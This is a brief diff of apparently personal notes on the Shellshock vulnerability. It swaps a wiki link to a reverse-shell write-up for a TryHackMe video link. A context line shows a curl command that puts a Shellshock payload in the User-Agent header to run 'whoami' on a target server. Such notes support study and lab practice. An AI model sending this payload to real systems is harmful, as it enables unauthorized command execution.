@@ -20,7 +20,7 @@ curl -A "() { :;}; echo Content-Type: text/html; echo; /usr/bin/whoami;" http://
 	```
 
 # Some Example
-- [[0day#Exploiting Shell Shock Reverse Shell User flag]]
+- [TryHackMe 0day](https://youtu.be/TS_yfDqr_3s?t=1052)
 
 
 
